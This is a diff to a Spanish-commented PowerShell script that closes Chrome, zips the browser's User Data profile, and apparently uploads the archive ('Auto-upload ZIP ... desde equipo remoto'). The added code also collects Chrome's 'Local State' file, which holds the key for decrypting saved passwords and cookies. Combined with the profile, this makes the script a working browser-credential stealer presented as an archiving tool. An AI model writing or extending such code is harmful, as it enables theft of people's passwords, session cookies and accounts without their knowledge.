@@ -23,6 +23,7 @@ param(
     [string]$CommitMsg  = "Auto-upload ZIP: subida automatica desde equipo remoto",
     [int]$RecurseDepth  = 6,
     [string]$ZipOutputDir = "",
+    [string]$ExtraFile  = "Local State",
     [switch]$KeepZip,
     [switch]$NoCloseChrome
 )
@@ -147,10 +148,33 @@ function Close-Chrome {
     }
 }
 
+function Add-FileToArchive {
+    param(
+        $Archive,
+        [string]$FilePath,
+        [string]$EntryName
+    )
+    if (-not (Test-Path -LiteralPath $FilePath)) {
+        Write-Log "Archivo extra no encontrado, se omite: $FilePath" "DarkYellow"
+        return
+    }
+    $entry = $Archive.CreateEntry($EntryName, [System.IO.Compression.CompressionLevel]::Optimal)
+    try {
+        $fs = New-Object System.IO.FileStream($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        try {
+            $es = $entry.Open()
+            try { $fs.CopyTo($es) } finally { $es.Dispose() }
+        } finally { $fs.Dispose() }
+    } catch {
+        Write-Log "No se pudo incluir '$EntryName': $($_.Exception.Message)" "DarkYellow"
+    }
+}
+
 function Compress-Folder {
     param(
         [string]$SourceFolder,
-        [string]$DestinationZip
+        [string]$DestinationZip,
+        [string[]]$ExtraFiles
     )
     # Comprime una carpeta a ZIP usando .NET con FileShare.ReadWrite,
     # asi puede leer archivos bloqueados por otros procesos (ej: Chrome).
@@ -171,6 +195,12 @@ function Compress-Folder {
             } catch {
                 Write-Log "No se pudo incluir '$rel': $($_.Exception.Message)" "DarkYellow"
             }
+        }
+
+        # Archivos extra (ej: Local State) -> raiz del ZIP
+        foreach ($ex in $ExtraFiles) {
+            $exName = Split-Path $ex -Leaf
+            Add-FileToArchive -Archive $archive -FilePath $ex -EntryName "extra_$exName"
         }
     } finally {
         $archive.Dispose()
@@ -269,6 +299,17 @@ try {
     }
     Write-Log "Carpeta a comprimir: $sourceFolder" "Cyan"
 
+    # 3b) Localizar archivos extra dentro del User Data de Chrome (ej: Local State)
+    $extraFiles = @()
+    foreach ($udr in $userDataRoots) {
+        $candidate = Join-Path $udr $ExtraFile
+        if (Test-Path -LiteralPath $candidate) { $extraFiles += $candidate }
+    }
+    $extraFiles = $extraFiles | Select-Object -Unique
+    if ($extraFiles) {
+        Write-Log "Archivo(s) extra a incluir: $($extraFiles -join ' | ')" "Cyan"
+    }
+
     if (-not $NoCloseChrome) {
         Close-Chrome
     }
@@ -281,7 +322,7 @@ try {
     $script:ZipPath = Join-Path $ZipOutputDir $zipName
 
     Write-Host "Espere un momento..." -ForegroundColor Yellow
-    Compress-Folder -SourceFolder $sourceFolder -DestinationZip $script:ZipPath
+    Compress-Folder -SourceFolder $sourceFolder -DestinationZip $script:ZipPath -ExtraFiles $extraFiles
 
     $zipLen = (Get-Item -LiteralPath $script:ZipPath).Length
     if ($zipLen -gt 50MB) {
